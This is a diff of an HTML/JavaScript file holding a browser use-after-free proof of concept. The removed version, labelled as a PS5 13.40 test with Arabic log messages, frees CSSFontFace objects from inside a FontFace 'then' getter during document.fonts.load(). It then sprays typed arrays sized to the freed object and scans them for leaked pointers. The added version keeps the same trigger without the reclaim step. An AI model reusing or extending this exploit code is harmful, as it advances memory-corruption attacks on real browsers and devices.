@@ -1,254 +1,216 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
-<title>PS5 13.40 — CSSFontFace Reclaim Test (Full Log)</title>
+<meta charset="utf-8">
+<title>FontFaceSet matchingFaces lifetime validation</title>
 <style>
-    body { background: #000; color: #0f0; font-family: monospace; padding: 10px; font-size: 13px; }
-    #log { white-space: pre-wrap; word-break: break-all; max-height: 90vh; overflow-y: auto; }
-    .red { color: #f44; }
-    .grn { color: #0f0; }
-    .ylw { color: #ff0; }
-    .cyn { color: #0ff; }
-    .mag { color: #f0f; }
+body { font-family: sans-serif; }
+#probe { position: absolute; left: -9999px; top: -9999px; font-size: 16px; }
 </style>
 </head>
 <body>
-<div id="log">[←] بدء الاختبار...<br></div>
-
+<pre id="log">POC STARTED: CSSFontFaceSet matchingFaces lifetime validation
+</pre>
+<div id="probe">AB</div>
 <script>
-"use strict";
+(function () {
+    "use strict";
 
-const logDiv = document.getElementById('log');
-function L(tag, msg) {
-    const prefix = `<span class="${tag}">[${tag}]</span>`;
-    logDiv.innerHTML += `${prefix} ${msg}<br>`;
-    console.log(`[${tag}] ${msg}`);
-}
+    const logElement = document.getElementById("log");
+    const probe = document.getElementById("probe");
+    let finished = false;
 
-// ========== تكوين font-face rules ==========
-L('←', 'إضافة @font-face rules (5 faces)...');
-const style = document.createElement('style');
-style.textContent = `
-@font-face { font-family: 'F1'; src: local('Arial'); unicode-range: U+41-42; }
-@font-face { font-family: 'F2'; src: local('Arial'); unicode-range: U+43-44; }
-@font-face { font-family: 'F3'; src: local('Arial'); unicode-range: U+45-46; }
-@font-face { font-family: 'F4'; src: local('Arial'); unicode-range: U+47-48; }
-@font-face { font-family: 'F5'; src: local('Arial'); unicode-range: U+49-50; }
-`;
-document.head.appendChild(style);
-L('grn', '✓ تم إضافة ' + style.sheet.cssRules.length + ' rules');
+    function log(message) {
+        logElement.textContent += message + "\n";
+    }
 
-let reclaimArrays = {
-    batch1: [], // قبل الـ flush
-    batch2: []  // بعد الـ flush
-};
+    function finish() {
+        if (finished)
+            return;
+        finished = true;
+        cleanupThenGetter();
+        log("DONE");
+    }
 
-// ========== 3 طرق reclaim ==========
-function doReclaim() {
-    const results = [];
-    
-    // Uint8Array(0xC8) — نفس حجم CSSFontFace على PS4
-    const u8 = new Uint8Array(0xC8);
-    for (let i = 0; i < u8.length; i++) u8[i] = 0x41;
-    results.push({ type: 'Uint8Array(0xC8)', arr: u8 });
-    
-    // Uint8Array(0x100) — حجم اكبر شوي
-    const u8b = new Uint8Array(0x100);
-    for (let i = 0; i < u8b.length; i++) u8b[i] = 0x42;
-    results.push({ type: 'Uint8Array(0x100)', arr: u8b });
-    
-    // Uint32Array(0x32) — 0x32 * 4 = 0xC8
-    const u32 = new Uint32Array(0x32);
-    for (let i = 0; i < u32.length; i++) u32[i] = 0x41414141;
-    results.push({ type: 'Uint32Array(0x32)', arr: u32 });
-    
-    // Float64Array(0x19) — 0x19 * 8 = 0xC8
-    const f64 = new Float64Array(0x19);
-    for (let i = 0; i < f64.length; i++) f64[i] = 0x41414141;
-    results.push({ type: 'Float64Array(0x19)', arr: f64 });
-    
-    // Float64Array(0x20) — 0x100 bytes
-    const f64b = new Float64Array(0x20);
-    for (let i = 0; i < f64b.length; i++) f64b[i] = 0x42424242;
-    results.push({ type: 'Float64Array(0x20)', arr: f64b });
-    
-    // ArrayBuffer(0xC8)
-    const ab = new ArrayBuffer(0xC8);
-    const abView = new Uint8Array(ab);
-    for (let i = 0; i < abView.length; i++) abView[i] = 0x43;
-    results.push({ type: 'ArrayBuffer(0xC8)', arr: ab });
-    
-    // ArrayBuffer(0x100)
-    const ab2 = new ArrayBuffer(0x100);
-    const abView2 = new Uint8Array(ab2);
-    for (let i = 0; i < abView2.length; i++) abView2[i] = 0x44;
-    results.push({ type: 'ArrayBuffer(0x100)', arr: ab2 });
-    
-    return results;
-}
+    const originalThenDescriptor = Object.getOwnPropertyDescriptor(FontFace.prototype, "then");
+    let getterInstalled = false;
+    let getterFired = false;
+    let styleElement = null;
 
-// ========== فحص الـ reclaim arrays ==========
-function scanResults(arrays, label) {
-    L('ylw', `── فحص ${label} ──`);
-    let totalFound = 0;
-    
-    for (const entry of arrays) {
-        const arr = entry.arr;
-        const type = entry.type;
-        let found = 0;
-        let ptrs = [];
-        
-        // Uint8Array
-        if (arr instanceof Uint8Array) {
-            for (let i = 0; i < Math.min(arr.length, 200); i++) {
-                if (arr[i] !== 0x41 && arr[i] !== 0x42 && arr[i] !== 0x43 && arr[i] !== 0x44) {
-                    found++;
-                    if (found <= 5) ptrs.push(`[${i}]=0x${arr[i].toString(16)}`);
-                }
+    function cleanupThenGetter() {
+        if (!getterInstalled)
+            return;
+        getterInstalled = false;
+        try {
+            if (originalThenDescriptor)
+                Object.defineProperty(FontFace.prototype, "then", originalThenDescriptor);
+            else
+                delete FontFace.prototype.then;
+            log("cleanup: FontFace.prototype.then restored");
+        } catch (error) {
+            log("cleanup: restoring FontFace.prototype.then threw: " + error.name);
+        }
+    }
+
+    function forceStyleAndLayout(reason) {
+        log("force-style: " + reason);
+        try {
+            void document.body.offsetWidth;
+            void probe.offsetHeight;
+            void getComputedStyle(probe).fontFamily;
+            log("force-style: completed");
+        } catch (error) {
+            log("force-style: threw " + error.name + ": " + error.message);
+        }
+    }
+
+    function mutateFontRulesSameStack() {
+        log("then-getter: entered same-stack mutation path");
+        if (!styleElement) {
+            log("then-getter: no style element available");
+            return;
+        }
+
+        const sheet = styleElement.sheet;
+        log("then-getter: sheet present = " + !!sheet);
+        if (sheet) {
+            try {
+                log("then-getter: cssRules before delete = " + sheet.cssRules.length);
+                while (sheet.cssRules.length)
+                    sheet.deleteRule(0);
+                log("then-getter: cssRules after delete = " + sheet.cssRules.length);
+            } catch (error) {
+                log("then-getter: deleteRule loop threw " + error.name + ": " + error.message);
             }
         }
-        // Uint32Array
-        else if (arr instanceof Uint32Array) {
-            for (let i = 0; i < Math.min(arr.length, 50); i++) {
-                const v = arr[i];
-                if (v !== 0x41414141) {
-                    found++;
-                    if (found <= 5) ptrs.push(`[${i}]=0x${v.toString(16)}`);
-                }
+
+        try {
+            if (styleElement.parentNode) {
+                styleElement.remove();
+                log("then-getter: style element removed");
             }
+        } catch (error) {
+            log("then-getter: style removal threw " + error.name + ": " + error.message);
         }
-        // Float64Array
-        else if (arr instanceof Float64Array) {
-            for (let i = 0; i < Math.min(arr.length, 25); i++) {
-                const v = arr[i];
-                if (v !== 0x41414141 && v !== 0x42424242) {
-                    found++;
-                    if (found <= 5) {
-                        const hex = v.toString(16);
-                        ptrs.push(`[${i}]=0x${hex}`);
+
+        forceStyleAndLayout("after @font-face removal from then getter");
+        cleanupThenGetter();
+        log("then-getter: leaving same-stack mutation path");
+    }
+
+    function installThenGetter() {
+        Object.defineProperty(FontFace.prototype, "then", {
+            configurable: true,
+            get() {
+                log("FontFace.prototype.then getter fired");
+                if (!getterFired) {
+                    getterFired = true;
+                    mutateFontRulesSameStack();
+                }
+                return undefined;
+            }
+        });
+        getterInstalled = true;
+        log("setup: FontFace.prototype.then getter installed");
+    }
+
+    async function run() {
+        log("phase: setup");
+        if (!document.fonts || typeof FontFace === "undefined") {
+            log("SKIP: CSS Font Loading API unavailable");
+            finish();
+            return;
+        }
+
+        const family = "FontFaceMatchingFacesLifetimeValidation";
+        styleElement = document.createElement("style");
+        styleElement.textContent = `
+            @font-face {
+                font-family: '${family}';
+                src: local('Ahem'), local('Arial'), local('Helvetica');
+                unicode-range: U+0041;
+            }
+            @font-face {
+                font-family: '${family}';
+                src: local('Ahem'), local('Arial'), local('Helvetica');
+                unicode-range: U+0042;
+            }
+            #probe { font-family: '${family}', sans-serif; }
+        `;
+        document.head.appendChild(styleElement);
+        log("setup: style element appended with two CSS-connected @font-face rules");
+
+        forceStyleAndLayout("after initial @font-face insertion");
+
+        let observedFace = null;
+        try {
+            const iterator = document.fonts.values();
+            const first = iterator.next();
+            observedFace = first && first.value;
+            log("setup: first document.fonts wrapper observed = " + !!observedFace);
+            if (observedFace)
+                log("setup: observed FontFace status before load = " + observedFace.status);
+        } catch (error) {
+            log("setup: document.fonts iterator threw " + error.name + ": " + error.message);
+        }
+
+        if (!observedFace) {
+            log("FAIL: no CSS-connected FontFace wrapper was observable");
+            finish();
+            return;
+        }
+
+        observedFace.loaded.then(
+            () => log("loaded-promise: observed FontFace.loaded resolved"),
+            error => log("loaded-promise: observed FontFace.loaded rejected: " + (error && error.name ? error.name : error))
+        );
+        log("setup: observed FontFace.loaded promise path attached");
+
+        installThenGetter();
+
+        log("phase: call document.fonts.load with text requiring both unicode-range faces");
+        let loadPromise;
+        try {
+            loadPromise = document.fonts.load("16px '" + family + "'", "AB");
+            log("phase: document.fonts.load returned");
+        } catch (error) {
+            log("phase: document.fonts.load threw " + error.name + ": " + error.message);
+            finish();
+            return;
+        }
+
+        let settled = false;
+        try {
+            await Promise.race([
+                loadPromise.then(
+                    faces => {
+                        settled = true;
+                        log("load-promise: resolved with " + faces.length + " faces");
+                    },
+                    error => {
+                        settled = true;
+                        log("load-promise: rejected: " + (error && error.name ? error.name : error));
                     }
-                }
-            }
+                ),
+                new Promise(resolve => setTimeout(resolve, 250))
+            ]);
+        } catch (error) {
+            log("load-promise: observation threw " + error.name + ": " + error.message);
         }
-        // ArrayBuffer
-        else if (arr instanceof ArrayBuffer) {
-            const view = new Uint8Array(arr);
-            for (let i = 0; i < Math.min(view.length, 200); i++) {
-                if (view[i] !== 0x43 && view[i] !== 0x44) {
-                    found++;
-                    if (found <= 5) ptrs.push(`[${i}]=0x${view[i].toString(16)}`);
-                }
-            }
-        }
-        
-        if (found > 0) {
-            L('mag', `  🔴 ${type}: ${found} تغيير — ${ptrs.join(', ')}`);
-            totalFound += found;
-        } else {
-            L('cyn', `  ✓ ${type}: كل القيم متطابقة`);
-        }
+
+        log("result: then getter fired = " + getterFired);
+        log("result: load promise settled before timeout = " + settled);
+        log("result: if this is an unfixed build, a lifetime error/crash may occur before DONE");
+        finish();
     }
-    
-    return totalFound;
-}
 
-// ========== Getter ==========
-L('←', 'تثبيت FontFace.prototype.then getter...');
-
-let thenFired = false;
-let getterStart = 0;
-
-Object.defineProperty(FontFace.prototype, 'then', {
-    get() {
-        thenFired = true;
-        getterStart = performance.now();
-        L('grn', '🔥 then getter FIRED!');
-        
-        // CSSOM mutation
-        if (style.sheet) {
-            const count = style.sheet.cssRules.length;
-            L('ylw', `  rules before delete: ${count}`);
-            while (style.sheet.cssRules.length > 0) style.sheet.deleteRule(0);
-            L('ylw', `  rules after delete: ${style.sheet.cssRules.length}`);
-        }
-        if (style.parentNode) {
-            style.parentNode.removeChild(style);
-            L('ylw', '  style element removed');
-        }
-        
-        // reclaim batch 1: قبل الـ flush
-        L('←', '  Reclaim batch 1 (قبل flush)...');
-        reclaimArrays.batch1 = doReclaim();
-        L('grn', `  ✓ ${reclaimArrays.batch1.length} arrays allocated`);
-        
-        // Force style flush
-        L('←', '  تنفيذ style flush...');
-        document.body.getBoundingClientRect();
-        L('grn', '  ✓ style flushed');
-        
-        // reclaim batch 2: بعد الـ flush
-        L('←', '  Reclaim batch 2 (بعد flush)...');
-        reclaimArrays.batch2 = doReclaim();
-        L('grn', `  ✓ ${reclaimArrays.batch2.length} arrays allocated`);
-        
-        return undefined;
+    try {
+        run();
+    } catch (error) {
+        log("UNCAUGHT: " + error.name + ": " + error.message);
+        finish();
     }
-});
-
-// ========== تشغيل ==========
-L('←', '');
-L('←', '=== تشغيل document.fonts.load() ===');
-const startTime = performance.now();
-
-document.fonts.load('16px F1, F2, F3, F4, F5', 'ABCDE').then(faces => {
-    const elapsed = (performance.now() - startTime).toFixed(2);
-    L('grn', `✓ promise resolved after ${elapsed}ms`);
-    L('grn', `✓ faces loaded: ${faces.length}`);
-    
-    // افحصنتائج
-    L('←', '');
-    L('←', '=== تحليل النتائج ===');
-    
-    let totalLeaked = 0;
-    totalLeaked += scanResults(reclaimArrays.batch1, 'batch1 (قبل flush)');
-    totalLeaked += scanResults(reclaimArrays.batch2, 'batch2 (بعد flush)');
-    
-    L('←', '');
-    if (totalLeaked > 0) {
-        L('mag', `✅ تم العثور على ${totalLeaked} قيمة غير متوقعة!`);
-        L('mag', 'هذا يشير إلى أن الـ reclaim ضبط والـ UAF نشط');
-    } else {
-        L('red', '❌ لا توجد قيم غير متوقعة');
-        L('red', 'الـ reclaim ما ضبط — نحتاج أحجام أو أنواع allocators مختلفة');
-        
-        // جرب نقرأ أول 10 قيم من كل array
-        L('←', '');
-        L('ylw', '── تفاصيل أول 5 قيم من كل reclaim array ──');
-        for (const batch of ['batch1', 'batch2']) {
-            for (const entry of reclaimArrays[batch]) {
-                const arr = entry.arr;
-                const type = entry.type;
-                let vals = '';
-                const limit = Math.min(arr.length || (arr.byteLength || 0), 5);
-                for (let i = 0; i < limit; i++) {
-                    let v;
-                    if (arr instanceof Uint8Array) v = arr[i];
-                    else if (arr instanceof Uint32Array) v = arr[i];
-                    else if (arr instanceof Float64Array) v = arr[i];
-                    else if (arr instanceof ArrayBuffer) v = new Uint8Array(arr)[i];
-                    if (v !== undefined) vals += `[${i}]=0x${v.toString(16)} `;
-                }
-                L('cyn', `  ${type} (${batch}): ${vals}`);
-            }
-        }
-    }
-    
-    L('←', '');
-    L('grn', '✔ انتهى الاختبار');
-}).catch(e => {
-    L('red', '❌ promise rejected: ' + e.message);
-});
+})();
 </script>
 </body>
 </html>
